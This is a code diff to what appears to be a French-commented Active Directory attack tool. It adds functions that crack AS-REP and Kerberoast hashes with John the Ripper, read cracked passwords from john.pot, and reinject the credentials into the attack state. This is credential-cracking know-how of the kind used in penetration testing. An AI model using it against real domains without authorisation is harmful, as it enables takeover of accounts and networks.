@@ -1564,6 +1564,34 @@ def _extract_cracked_user(hashline):
     if m: return m.group(1)
     return None
 
+def _hashfile_users(path):
+    """Usernames presents dans un fichier de hashes AS-REP/Kerberoast."""
+    users = set()
+    try:
+        for line in open(path, encoding="utf-8", errors="ignore"):
+            u = _extract_cracked_user(line)
+            if u:
+                users.add(u)
+    except Exception:
+        pass
+    return users
+
+def _john_pot_lines(valid_users):
+    """Lit john.pot (hash_complet:password) et garde les lignes de NOS users.
+    (john --show affiche '?:pw' pour les hashes Kerberos -> le pot a le vrai user)."""
+    out = []
+    for pot in (os.path.expanduser("~/.john/john.pot"), "john.pot"):
+        if not os.path.isfile(pot):
+            continue
+        try:
+            for pl in open(pot, encoding="utf-8", errors="ignore"):
+                u = _extract_cracked_user(pl)
+                if u and (not valid_users or u in valid_users):
+                    out.append(pl.strip())
+        except Exception:
+            pass
+    return out
+
 def crack_hashes(args, state):
     """Crack AS-REP (18200) et Kerberoast (13100), reinjecte les creds trouvees."""
     hashes = state.get("hashes", {})
@@ -1592,9 +1620,10 @@ def crack_hashes(args, state):
         # 2) fallback John (CPU) si hashcat n'a rien sorti (ex: pas de GPU/OpenCL en VM)
         if not cracked.strip() and have("john"):
             log(f"{C.GR}[i] Crack {kind} via John (CPU)...{C.X}")
-            run_cmd(["john", f"--wordlist={wl}", path], args.crack_timeout)
-            rc, out, _ = run_cmd(["john", "--show", path], 120)
-            cracked = out
+            run_cmd(["john", "--format=" + ("krb5asrep" if kind == "asrep" else "krb5tgs"),
+                     f"--wordlist={wl}", path], args.crack_timeout)
+            # john --show donne '?:pw' pour krb5 -> on lit john.pot (hash complet -> vrai user)
+            cracked = "\n".join(_john_pot_lines(_hashfile_users(path)))
         for line in cracked.splitlines():
             line = line.strip()
             if ":" not in line or re.search(
